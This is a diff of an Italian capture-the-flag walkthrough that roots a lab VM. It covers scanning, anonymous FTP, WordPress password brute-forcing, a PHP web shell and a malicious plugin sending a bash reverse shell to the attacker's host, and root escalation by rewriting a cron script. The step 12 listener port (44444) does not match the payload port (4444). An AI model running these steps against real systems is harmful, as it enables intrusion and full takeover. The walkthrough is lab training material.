@@ -1,7 +1,8 @@
-Step:
+# Step:
 
-1. sudo nmap -sn 192.168.1.0/24  // scansiono la rete per vedere cosa c'è collegato
-    
+## 1. sudo nmap -sn 192.168.1.0/24  // scansiono la rete per vedere cosa c'è collegato
+
+```text
     Risultato:
     Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-17 16:00 +0200
     Nmap scan report for pfSense.home.arpa (192.168.1.1)
@@ -17,9 +18,11 @@ Step:
     viene riconosciuta la macchina kali da cui lancio il comando 192.168.1.10
     la pfSense che fa da router 192.168.1.1
     la macchina da attaccare 192.168.1.12
+```
 
-2. sudo nmap -sS -sV -p- -T5 192.168.1.12 // cerco i servizi e versioni aperte sulla macchina da attaccare
+## 2. sudo nmap -sS -sV -p- -T5 192.168.1.12 // cerco i servizi e versioni aperte sulla macchina da attaccare
 
+```text
     Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-17 16:04 +0200
     Nmap scan report for 192.168.1.12
     Host is up (0.000065s latency).
@@ -33,9 +36,11 @@ Step:
 
     Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     Nmap done: 1 IP address (1 host up) scanned in 7.52 seconds
+```
 
-3. ftp 192.168.1.12 // ho visto i lservizio ftp aperto spesso il piu debole provo ad attaccarlo
-    
+## 3. ftp 192.168.1.12 // ho visto i lservizio ftp aperto spesso il piu debole provo ad attaccarlo
+
+```text  
     Connected to 192.168.1.12.
     220 (vsFTPd 2.3.5)
     Name (192.168.1.12:kali):
@@ -45,9 +50,11 @@ Step:
     provo a entrare con anonymous e mi lascia loggarmi
 
     dentrato dentro public e ho trovato il file users.txt.bk
+```
 
-4. lanciato get users.txt.bk
+## 4. lanciato get users.txt.bk
 
+```text
     ─(kali㉿kali)-[~]
     └─$ cat users.txt.bk      
     abatchy
@@ -55,25 +62,31 @@ Step:
     mai
     anne
     doomguy
+```
 
-5. mi da errore hydra
+## 5. mi da errore hydra
 
+```text
     Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-17 16:30:05
     [DATA] max 4 tasks per 1 server, overall 4 tasks, 86066394 login tries (l:6/p:14344399), ~21516599 tries per task
     [DATA] attacking ssh://192.168.1.12:22/
     [ERROR] target ssh://192.168.1.12:22/ does not support password authentication (method reply 4).
+```
 
-6. lancio il comando curl http://192.168.1.12/
+## 6. lancio il comando curl http://192.168.1.12/
 
+```text
     ┌──(kali㉿kali)-[~]
     └─$ curl http://192.168.1.12/
     <html><body><h1>It works!</h1>
     <p>This is the default web page for this server.</p>
     <p>The web server software is running but no content has been added, yet.</p>
     </body></html>
+```
 
-7. wpscan --url http://192.168.1.12/backup_wordpress --enumerate u 
+## 7. wpscan --url http://192.168.1.12/backup_wordpress --enumerate u 
 
+```text
     └─$ wpscan --url http://192.168.1.12/backup_wordpress --enumerate u 
     _______________________________________________________________
             __          _______   _____
@@ -178,9 +191,10 @@ Step:
     [+] Memory used: 205.477 MB
     [+] Elapsed time: 00:00:02
 
+```
+## 8. wpscan --url http://192.168.1.12/backup_wordpress --usernames john --passwords /usr/share/wordlists/rockyou.txt
 
-8. wpscan --url http://192.168.1.12/backup_wordpress --usernames john --passwords /usr/share/wordlists/rockyou.txt
-
+```text
     [i] No Config Backups Found.
 
     [+] Performing password attack on Xmlrpc against 1 user/s
@@ -203,50 +217,180 @@ Step:
 
     Username: john
     password: enigma
+```
+## 9. http://192.168.1.12/backup_wordpress/wp-admin/ // da mettere su firewall
 
-9. http://192.168.1.12/backup_wordpress/wp-admin/ // da mettere su firewall
+```text
+    passwrod admin generata: RXhF&RcJqTXaC(h)3g&Nv$7w  ruolo administrator
+    password jhon: enigma ruolo administrator
 
-    entro con le credenziali appena trovate
+```
+## 10. OTTENERE UNA SHELL INIZIALE (www-data)
 
-    appereance->Editor->404 Templates
+```text
+    Creazione del file shell.php
+    bash
 
-    inserisco questo codice per inserire codice malevolo
-        <?php
+    nano shell.php
 
-        /**
-        * The template for displaying 404 pages (not found)
-        *
-        * @package WordPress
-        * @subpackage Twenty_Sixteen
-        * @since Twenty Sixteen 1.0
-        */
+    Contenuto:
+    php
 
-        get_header(); ?>
+    <?php
+    /**
+    * Plugin Name: Shell
+    * Description: Reverse shell
+    * Version: 1.0
+    * Author: Test
+    */
 
-        <div id="primary" class="content-area">
-            <main id="main" class="site-main" role="main">
+    exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.10/4444 0>&1'");
+    ?>
 
-                <section class="error-404 not-found">
-                    <header class="page-header">
-                        <h1 class="page-title"><?php _e( 'Oops! That page can&rsquo;t be found.', 'twentysixteen' ); ?></h1>
-                    </header><!-- .page-header -->
+    Creazione del file ZIP
+    bash
 
-                    <div class="page-content">
-                        <?php
-                        if(isset($_GET['cmd'])){
-                            echo "<pre>";
-                            system($_GET['cmd']);
-                            echo "</pre>";
-                        }
-                        ?>
-                    </div><!-- .page-content -->
-                </section><!-- .error-404 -->
+    zip shell.zip shell.php
 
-            </main><!-- .site-main -->
+    Caricamento su WordPress
 
-            <?php get_sidebar( 'content-bottom' ); ?>
+        Accesso a: http://192.168.1.12/backup_wordpress/wp-admin/
 
-        </div><!-- .content-area -->
+        Vai a Plugins → Upload Plugin
 
-        <?php get_sidebar(); ?>
-        <?php get_footer(); ?>
+        Carica shell.zip
+
+        Attiva il plugin
+
+    Listener per la shell
+    bash
+
+    nc -lvnp 4444
+
+    Esecuzione della shell
+    text
+
+    http://192.168.1.12/backup_wordpress/wp-content/plugins/shell/shell.php
+
+    RISULTATO: Shell come www-data@bsides2018
+```
+
+## 11. ENUMERAZIONE DEL SISTEMA
+
+```text
+    Esplorazione iniziale
+    bash
+
+    whoami
+    # www-data
+
+    id
+    # uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+    pwd
+    # /var/www/backup_wordpress
+
+    hostname
+    # bsides2018
+
+    uname -a
+    # (versione del kernel)
+
+    cat /etc/passwd | grep /bin/bash
+    # root, abatchy, john, mai, anne, doomguy
+
+    Controllo file SUID
+    bash
+
+    find / -perm -4000 -type f 2>/dev/null
+
+    Controllo processi e servizi
+    bash
+
+    ps aux
+
+    Controllo crontab
+    bash
+
+    cat /etc/crontab
+
+    RISULTATO:
+    text
+
+    * * * * * root /usr/local/bin/cleanup
+
+        Job cron che viene eseguito ogni minuto come root
+
+        Percorso: /usr/local/bin/cleanup
+```
+
+## 12. PRIVILEGE ESCALATION - SFRUTTARE IL CRON JOB
+
+```text
+    Verifica del file cleanup
+    bash
+
+    ls -la /usr/local/bin/cleanup
+
+    Se il file è scrivibile:
+    bash
+
+    echo '#!/bin/bash' > /usr/local/bin/cleanup
+    echo 'bash -i >& /dev/tcp/192.168.1.10/4444 0>&1' >> /usr/local/bin/cleanup
+    chmod +x /usr/local/bin/cleanup
+
+    Se il file non è scrivibile ma la directory lo è:
+    bash
+
+    mv /usr/local/bin/cleanup /usr/local/bin/cleanup.bak
+    echo '#!/bin/bash' > /usr/local/bin/cleanup
+    echo 'bash -i >& /dev/tcp/192.168.1.10/4444 0>&1' >> /usr/local/bin/cleanup
+    chmod +x /usr/local/bin/cleanup
+
+    Alternativa - Aggiungere comando al file esistente:
+    bash
+
+    echo 'bash -i >& /dev/tcp/192.168.1.10/4444 0>&1' >> /usr/local/bin/cleanup
+
+    Listener per la shell root
+    bash
+
+    nc -lvnp 44444
+
+    Attendere l'esecuzione del cron (1 minuto)
+
+    Il cron esegue automaticamente il file cleanup ogni minuto.
+
+    RISULTATO:
+    text
+
+    connect to [192.168.1.10] from (UNKNOWN) [192.168.1.12] 54354
+    bash: no job control in this shell
+    root@bsides2018:~#
+```
+
+## 13. OTTENERE LA FLAG
+```text
+    Esplorazione della directory root
+    bash
+
+    cd /root
+    ls -la
+
+    Lettura della flag
+    bash
+
+    cat /root/flag.txt
+
+    RISULTATO:
+    text
+
+    Congratulations!
+    If you can read this, that means you were able to obtain root permissions on this VM.
+    You should be proud!
+
+    There are multiple ways to gain access remotely, as well as for privilege escalation.
+    Did you find them all?
+
+    @batchy17
+```
